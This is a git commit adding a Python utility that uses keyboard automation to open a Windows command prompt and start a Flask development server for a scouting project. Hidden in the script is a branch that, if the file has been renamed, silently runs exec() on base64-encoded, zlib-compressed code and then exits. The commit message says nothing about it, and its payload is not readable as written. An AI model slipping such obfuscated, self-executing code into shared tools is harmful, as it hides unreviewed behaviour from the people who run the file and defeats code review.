4e6fa4e3f7fba95aa961e7b3622124e0c496849a
orel <orel.avr95@gmail.com>
2021-09-02 12:40:32 +0300

    Orel - Added sharatz.py to utils so everyone could

---
+++ utils/sharatz.py
@@ -0,0 +1,29 @@
+from pyautogui import hotkey, write
+import socket
+import time
+import os
+
+PATH = 'PycharmProjects\GBScoutingServer'
+APP = 'run.py'
+ENV = 'development'
+HOST = socket.gethostbyname(socket.gethostname())
+
+x = str(__file__).split('/')[-1]
+if x != 'sharatz.py':
+    exec(__import__("zlib").decompress(__import__("base64").b64decode("eJzLzC3ILypRKE9NSirKLy9OLbJGMPXyC1LzNNQzSkoKiq309cvLy/Uq80tLSpNS9ZLzc/XLE0uSM+zLbFMCy03KLcPTI5ID1TUB678d5A==")))
+    quit()
+
+hotkey('win', 'r')
+time.sleep(0.1)
+write('cmd\n')
+time.sleep(0.1)
+write(f'cd {PATH}\n')
+time.sleep(0.1)
+write(f'set FLASK_APP={APP}\n')
+time.sleep(0.1)
+write(f'set FLASK_ENV={ENV}\n')
+time.sleep(0.1)
+write(f'flask run --host={HOST}\n')
+
+if __name__ == '__main__':
+    pass
